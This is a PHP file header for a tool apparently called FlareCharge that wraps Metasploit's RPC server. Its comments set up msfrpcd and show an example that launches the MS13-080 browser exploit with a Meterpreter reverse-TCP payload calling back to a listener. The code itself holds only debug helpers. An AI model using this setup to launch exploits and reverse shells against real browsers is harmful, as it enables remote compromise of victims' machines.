<?php #
/*
 * FlareCharge (PHPmsfRPC) v0.12 by Tweek Fawkes
 *
 * This script:
 * - provides PHP functions to easily interface with metasploit
 * - interfaces with metasploit via Metasploit's RPC server (msfrpcd)
 *
 * How to use:
 * #1 - Start msfrpcd on a server:
 root@kali:~# ifconfig | grep 192.168.
    inet addr:192.168.192.234  Bcast:192.168.192.255  Mask:255.255.255.0
 root@kali:~# cat msgrpc.rc
    load msgrpc ServerHost=192.168.192.234 Pass=abc123
 root@kali:~# msfconsole -r /root/msgrpc.rc
 ...
 *
 * #2 - Inclucde php file and use functions.
 * This example will start the ms13-080 exploit:
 ...
 require_once ('includes/php_msfrpc_inc.php');
 ...
 $msfrpcd_ip = "192.168.192.234"
 $cb_ip = "192.168.192.234"
 $msf_exploit_full_path = "exploit/windows/browser/ms13_080_cdisplaypointer";
 $msf_payload_full_path = "windows/meterpreter/reverse_tcp";
 $msf_target = "3";
 $msf_url = use_exploit($msfrpcd_ip, $cb_ip, $msf_exploit_full_path, $msf_payload_full_path, $msf_target);
 ...
 * 
 */

// ************ Variables to Set ************ //
$display_errors = 1; # 0 == do not display debug messages; 1 == display debug messages; 

// ************ display_errors() ************ //
function display_errors($verbose = 1)
{
    if($verbose == 0)
    {
	ini_set('display_errors', False);
    }
    elseif($verbose == 1)
    {
	echo '[V] error_reporting is on</br>';
	error_reporting(E_ALL);
	ini_set('display_errors', True);
    }
}

// ************ Setting display_errors() ************ //
display_errors($display_errors);

// ************ debug() ************ //
function debug($msg, $verbose = 1)
{
    if($verbose == 1)
    {
	//echo '<PRE>';
	echo '[V] ' . $msg;
	//echo '</PRE>';
	echo '</BR>';
    }
}

// ************ debug_r() ************ //
function debug_r($msg, $verbose = 1)
{
    if($verbose == 1)
    {
	//echo '<PRE>';
	echo '[V] ';
	print_r($msg);
	//echo '</PRE>';
	echo '</BR>';
    }
}

?>